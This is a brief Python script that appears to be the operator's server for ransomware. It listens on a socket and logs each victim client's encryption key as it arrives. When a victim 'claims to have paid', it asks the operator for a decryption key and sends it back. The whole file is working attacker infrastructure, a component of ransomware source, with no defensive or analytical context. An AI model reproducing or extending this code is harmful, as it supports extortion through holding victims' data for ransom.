import socket
from time import sleep

addr = ('', 5000)
skt = socket.socket()
skt.bind(addr)
skt.listen(1)
conn, address = skt.accept()
print(address[0] + ' just connected!')

while True:
    cmd = conn.recv(1024).decode()

    if cmd.startswith('[KEY]'):
        print('The key for this client is ' + cmd.split('[KEY]')[1])
        break
    elif cmd == '[DECODE]':
        print('This client claims to have paid')
        key = input('Key: ').encode()
        conn.send(key)
        break

skt.close()



